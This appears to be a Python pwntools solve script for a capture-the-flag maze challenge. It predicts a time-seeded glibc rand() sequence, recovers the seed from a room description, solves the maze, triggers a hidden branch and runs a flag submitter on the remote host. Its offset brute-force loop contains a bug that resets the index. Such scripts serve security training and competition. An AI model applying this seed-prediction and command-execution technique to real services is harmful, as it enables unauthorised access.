#!/usr/bin/env python3

import sys
from colorama import Fore
from pwn import *

import ctypes
from ctypes import CDLL

def get_starting_finishing_points():
    _start = [i for i in range(len(maze[0])) if maze[0][i] == 'c']
    _end = [i for i in range(len(maze[0])) if maze[len(maze)-1][i] == 'c']
    return [0, _start[0]], [len(maze) - 1, _end[0]]


def maze_solver():
    for i in range(0, len(maze)):
        for j in range(0, len(maze[0])):
            if maze[i][j] == 'u':
                print(Fore.WHITE, f'{maze[i][j]}', end=" ")
            elif maze[i][j] == 'c':
                print(Fore.GREEN, f'{maze[i][j]}', end=" ")
            elif maze[i][j] == 'p':
                print(Fore.BLUE, f'{maze[i][j]}', end=" ")
            else:
                print(Fore.RED, f'{maze[i][j]}', end=" ")
        print('\n')


def escape():
    current_cell = rat_path[len(rat_path) - 1]

    if current_cell == finish:
        return

    if maze[current_cell[0] + 1][current_cell[1]] == 'c':
        maze[current_cell[0] + 1][current_cell[1]] = 'p'
        rat_path.append([current_cell[0] + 1, current_cell[1]])
        escape()

    if maze[current_cell[0]][current_cell[1] + 1] == 'c':
        maze[current_cell[0]][current_cell[1] + 1] = 'p'
        rat_path.append([current_cell[0], current_cell[1] + 1])
        escape()

    if maze[current_cell[0] - 1][current_cell[1]] == 'c':
        maze[current_cell[0] - 1][current_cell[1]] = 'p'
        rat_path.append([current_cell[0] - 1, current_cell[1]])
        escape()

    if maze[current_cell[0]][current_cell[1] - 1] == 'c':
        maze[current_cell[0]][current_cell[1] - 1] = 'p'
        rat_path.append([current_cell[0], current_cell[1] - 1])
        escape()

    # If we get here, this means that we made a wrong decision, so we need to
    # backtrack
    current_cell = rat_path[len(rat_path) - 1]
    if current_cell != finish:
        cell_to_remove = rat_path[len(rat_path) - 1]
        rat_path.remove(cell_to_remove)
        maze[cell_to_remove[0]][cell_to_remove[1]] = 'c'

def get_path(maze, start, finish):

    path = ''

    pos = start
    print(pos, start, finish)
    while tuple(pos) != tuple(finish):
        maze[pos[0]][pos[1]] = 'x'
        # up
        if 0 < pos[0] < 42 and maze[pos[0]-1][pos[1]] == 'p':
            path += 'n'
            sys.stdout.write('n')
            pos = (pos[0]-1, pos[1])

        # down
        elif 0 <= pos[0] < 41 and maze[pos[0]+1][pos[1]] == 'p':
            path += 's'
            sys.stdout.write('s')
            pos = (pos[0]+1, pos[1])

        # left
        elif 0 < pos[1] < 42 and maze[pos[0]][pos[1]-1] == 'p':
            path += 'w'
            sys.stdout.write('w')
            pos = (pos[0], pos[1]-1)

        # right
        elif 0 <= pos[1] < 41 and maze[pos[0]][pos[1]+1] == 'p':
            path += 'e'
            sys.stdout.write('e')
            pos = (pos[0], pos[1]+1)
    sys.stdout.write('\n')
    return path

#    import IPython; IPython.embed()

def patch_seed(seed):
    e = ELF("./challenge.patched")
    e.write(0x1ac2, p32(seed))
    e.save("./challenge.patched")

def get_maze(seed):
    patch_seed(seed)
    #input(">>")
    env = os.environ.copy()
    env["LD_LIBRARY_PATH"] = "."
    r = process(["./ld-linux-x86-64.so.2", "./challenge.patched"], env=env)
    r.sendlineafter(b"torment: ", b"a")
    r.recvuntil(b'the maze.\n')
    maze_str = r.recvuntil(b'\n    ')
    maze_str = maze_str[:-4].decode()
    r.close()

    maze = [[y for y in x.replace('#', 'w').replace('.', 'c')] for x in maze_str.splitlines() if x ]

    start = None
    end = None
    for i in range(len(maze)):
        for j in range(len(maze[0])):
            if maze[i][j] == '@':
                start = [i, j]
                maze[i][j] = 'c'
            elif maze[i][j] == '*':
                end = [i, j]
                maze[i][j] = 'c'

    return maze_str, maze, start, end

def get_rand_times():
    env = os.environ.copy()
    env["LD_PRELOAD"] = "./derand.so"
    env["LD_LIBRARY_PATH"] = "."
    #r = process("./challenge.patched", env=env)
    r = process(["./ld-linux-x86-64.so.2", "./challenge.patched"], env=env)
    content = r.recvuntil(b'Which would you like to do?')
    r.close()
    return content.count(b'AAA!')

def get_seed_rands(seed, n):
 #   from ctypes import CDLL
    libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

    # Seed srand with time(0)
    now = int(seed)
    libc.srand(now)

    return [libc.rand() for _ in range(n)]

sizes = ["cozy", "medium-sized", "spacious", "massive"]
items = ["bookshelves", "fireplaces", "suits of armor", "tables", "chests", "beds", "paintings", "statues", "tapestries", "candelabras", "chairs", "fountains", "mirrors", "rugs", "curtains", "chess sets"]
styles = ["Art Deco", "Baroque", "Classical", "Colonial", "Contemporary", "Country", "Gothic", "Industrial", "Mediterranean", "Minimalist", "Neoclassical", "Renaissance", "Rococo", "Romantic", "Rustic", "Victorian"]

def rand_val_for_description(desc):
    size_str = desc.split('standing in a ')[1].split(' space')[0]
    item_one_str = desc.split('adorned with ')[1].split(' and a two large ')[0]
    item_two_str = desc.split('and a two large ')[1].split(' dominate the center')[0]
    num_flowers = int(desc.split('You see ')[1].split(' flowers')[0].strip())
    num_stars = int(desc.split('you stop to count ')[1].split(' stars.')[0].strip())
    style_str = desc.split('well designed in the ')[1].split(' style.')[0]

    size_num = sizes.index(size_str)
    item_one_num = items.index(item_one_str)
    item_two_num = items.index(item_two_str)
    style_num = styles.index(style_str)
    assert num_stars & 0x1f == num_flowers

    rand_val = 0
    rand_val |= size_num << 0
    rand_val |= item_one_num << 2
    rand_val |= item_two_num << 6
    rand_val |= style_num << 10
    rand_val |= num_stars << 14
    return rand_val

def brute_correct_time_offs_and_index(initial_time, rand_val):
    for i in range(-10, 10):
        i = 0
        rands = get_seed_rands(initial_time + i, 10000)
        try:
            idx = rands.index(rand_val)
            yield i, idx
        except ValueError:
            pass

def get_time_off_and_index(initial_time, description):
    rand_val = rand_val_for_description(description)
    for time_off, idx in brute_correct_time_offs_and_index(initial_time, rand_val):
        if idx != -1:
            return time_off, idx
    return None, None


if __name__ == '__main__':
    HOST = os.environ.get('HOST', 'localhost')
    PORT = 31337

    r = remote(HOST, int(PORT))
    libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    predicted_seed = libc.time(0)
    r.readuntil(b'You are in room (1, 1)\n')
    desc = r.readline().decode()
    
    time_off, idx = get_time_off_and_index(predicted_seed, desc)
    print(f"{time_off=}, {idx=}")

    seed = predicted_seed + time_off
    times = idx

    print("rand times:", times)
    libc.srand(seed)
    for _ in range(times):
        hex(libc.rand())

    maze_str, maze, start, finish = get_maze(seed)

    rat_path = [start]
    escape()
    maze_solver()
    path = get_path(maze, start, finish)

    for x in path[:-1]:
        libc.rand()
        r.sendlineafter(b'torment: ', x.encode())

    libc.rand()

    #print(hex(libc.rand()))
    times = 0
    while libc.rand() % 1213 != 1212:
        times += 1

    r.sendafter(b'torment: ', b'k\n'*times)
    r.clean()

    #gdb.attach(r)
    #input()
    r.sendline(path[-1])
    time.sleep(2)
    r.sendline(b'./submitter')
    r.recvuntil(b'Flag: ')
    print(r.recv().decode())
